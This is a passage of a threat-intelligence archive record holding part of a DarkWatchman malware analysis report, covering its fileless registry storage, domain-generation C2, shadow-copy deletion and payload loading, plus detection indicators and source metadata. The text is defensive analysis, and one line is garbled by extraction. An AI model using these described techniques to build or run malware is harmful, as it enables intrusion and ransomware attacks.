developer(s) may not be native English speakers.\n\n**IIIb. Takeaways**\n\n\n-----\n\nC a a ysts ou d t pa t cu a y o e t e ay t at a atc a ut es t e eg st y as a ay to co u cate bet ee abst acted\nthreads of operation, and as both persistent and temporary storage. It would appear that the authors of DarkWatchman identified and took\nadvantage of the complexity and opacity of the Windows Registry to work underneath or around the detection threshold of security tools and\nanalysts alike. Registry changes are commonplace, and it can be difficult to identify which changes are anomalous or outside the scope of\nnormal OS and software functions. Additionally, DarkWatchman’s ability to use the registry for both a temporary storage buffer (for information\nthat has yet to be sent to the C2), as well as a storage location for the encoded executable code prior to run time, indicates a robust\nunderstanding of software development and the Windows Operating System itself. The storage of the binary in the registry as encoded text\nmeans that Darkwatchman is persistent yet its executable is never (permanently) written to disk; it also means that DarkWatchman’s operators\ncan update (or replace) the malware every time it’s executed. In PACT’s analysis, this (along with DarkWatchman’s persistence and selfcompilation mechanisms that make use of LOLbins) represents an important step in the evolution of threat actor TTPs on Windows systems.\n\nAn additional capability of note is DarkWatchman’s DGA: the sheer number of domains (510 every day) ensure that DarkWatchman’s\noperators can dial up or dial down the resiliency of their C2 infrastructure as operational requirements dictate. This likely indicates that the TA\nmay (at times) require this resiliency or level of risk-mitigation in their planned operations; it may also indicate that the TA has an operational\nbudget that would allow them to register multiple domains daily (alternatively, it may indicate that DarkWatchman is designed to have an\noutsourced user base and the sheer number of domains generated by the DGA is required for deconfliction during operational use).\n\nFurthermore, the functionality of DarkWatchman lends additional weight to the theory that it is designed for criminal use rather than espionage\nor sabotage. DarkWatchman attempts to delete shadow copies on installation, appears to look for enterprise targets (e.g., it explicitly searches\nfor SmartCard Readers), and provides the ability to remotely load additional payloads. These may be indicators that the malware is intended to\nbe used as a first stage initial payload for ransomware deployment. The introduction of a DGA-determined C2 structure provides resiliency and\nrandomness to the C2 communications. One interesting hypothesis is that the ransomware operators could provide something like\nDarkWatchman to their less technologically capable affiliates, and once the affiliate gains a foothold in the system, it automatically\ncommunicates back to domains the operator controls. This would eliminate the need to have the affiliate deploy the ransomware or handle file\nexfiltration, and would move the ransomware operator from a negotiator role to actively controlling the infection. The capabilities and\nfunctionality of both the JavaScript and C# elements of DarkWatchman indicate a capable threat actor.\n\n[PACT’s final takeaway to underscore is related to the actor’s tactics, in the hopes of bringing the top of the “pyramid of pain” into focus.](https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html)\nThroughout the investigation, PACT noted a distinct lack of shared infrastructure; that is, the TA does not share their operational IPs with other\ntenants. The IP hosting the DGA-generated domains appear to be the actor’s alone. PACT also observed that the TA uses different\nAutonomous Systems (ASs), Hosting Providers, and name servers (and may or may not acquire a TLS certificate from a public CA) for their\noperational infrastructure, which can make it difficult for analysts to cluster this activity. This knowledge can hopefully assist defenders with\nbuilding context and any follow-on analysis.\n\n**_IV. Detection Opportunities_**\n\nDuring PACT’s analysis of DarkWatchman, the following detection opportunities were identified*:\n\n1. Anomalous registry keys seen in \\\\HKCU\\Software\\Microsoft\\Windows\\DWM\\\n\n8 character uid + 1 character identifier (see table in section IIb(x))\n2. Abnormal/invalid HTTP status codes (C2 server issuing commands via the C2 response)\n\nE.g., HTTP 8xx responses\n3. Observed HTTPS (tcp/443) traffic to URLs generated by the DGA\n\n7-character alphanumeric domains + “.top” + “/index.php”\nRef Netlab360’s tordwm DGA feed (daily): [https://data.netlab.360.com/dga/#tordwm](https://data.netlab.360.com/dga/#tordwm)\n4. User agent string (Incorrect Internet Explorer 11 UA – “rv:11.1”)\n5. Many DNS queries emanating from a single system/process in an abnormally short time window (as a result of the DGA-generated\n\nqueries)\n\n_*NOTE: these detection opportunities are not all-inclusive; many more almost certainly exist. PACT has included these for reference and to_\n_assist defenders with creating and building more robust detection signatures based on observed TTPs._\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-14 - DarkWatchman- A new evolution in fileless techniques.pdf"
    ],
    "report_names": [
        "2021-12-14 - DarkWatchman- A new evolution in fileless techniques.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535666,
    "ts_updated_at": 1743041141,
    "ts_creation_date": 1653767504,
    "ts_modification_date": 1653767504,
    "files": {
        "pdf": "https://archive.orkl.eu/93eff4e43a92d702567c4ba55408ee8f3207fc15.pdf",
        "text": "https://archive.orkl.eu/93eff4e43a92d702567c4ba55408ee8f3207fc15.txt",
        "img": "https://archive.orkl.eu/93eff4e43a92d702567c4ba55408ee8f3207fc15.jpg"
    }
}